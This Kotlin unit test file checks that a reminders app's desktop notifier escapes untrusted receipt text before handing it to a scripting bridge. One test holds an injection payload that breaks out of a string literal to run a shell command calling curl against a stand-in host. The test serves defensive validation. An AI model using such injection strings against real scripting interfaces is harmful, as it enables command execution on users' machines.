package app.keeply.reminders

import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * The notifier passes text that came off a receipt to the system's scripting
 * bridge. That text is untrusted, and these check it cannot escape the string
 * literal it is placed in.
 */
class DesktopNotifierTest {

    @Test
    fun quotesOrdinaryTextUnchanged() {
        assertEquals("\"Running Shoes\"", DesktopNotifier.quote("Running Shoes"))
    }

    @Test
    fun escapesTheCharactersThatWouldEndTheString() {
        // A product name read off a receipt could contain either of these, and
        // unescaped they would close the literal and let the rest run as code.
        assertEquals("\"He said \\\"hello\\\"\"", DesktopNotifier.quote("""He said "hello""""))
        assertEquals("\"back\\\\slash\"", DesktopNotifier.quote("""back\slash"""))
    }

    @Test
    fun neutralisesAnAttemptToRunSomething() {
        val hostile = """Shoes" & (do shell script "curl evil.invalid") & """"
        val quoted = DesktopNotifier.quote(hostile)

        // Every quote in the payload is escaped, so none of it can terminate the
        // literal and become script.
        assertTrue(quoted.startsWith("\""))
        assertTrue(quoted.endsWith("\""))
        val inner = quoted.substring(1, quoted.length - 1)
        assertFalse(
            Regex("""(?<!\\)"""").containsMatchIn(inner),
            "an unescaped quote survived: $quoted",
        )
    }

    @Test
    fun stripsControlCharactersRatherThanEncodingThem() {
        val quoted = DesktopNotifier.quote("Line one\nLine two\u0000\u007F")
        assertFalse(quoted.contains('\n'))
        assertFalse(quoted.contains('\u0000'))
        assertFalse(quoted.contains('\u007F'))
        assertEquals("\"Line oneLine two\"", quoted)
    }

    @Test
    fun trimsSomethingAbsurdlyLong() {
        val quoted = DesktopNotifier.quote("a".repeat(5_000))
        assertTrue(quoted.length < 300, "was ${quoted.length}")
    }

    @Test
    fun saysWhenItCannotShowAnything() {
        // Where the desktop offers nothing, Keeply admits it rather than pretending.
        // The home screen still shows what needs attention.
        assertFalse(Notifier.disabled.isAvailable)
        assertFalse(Notifier.disabled.notify("Title", "Body"))
    }
}
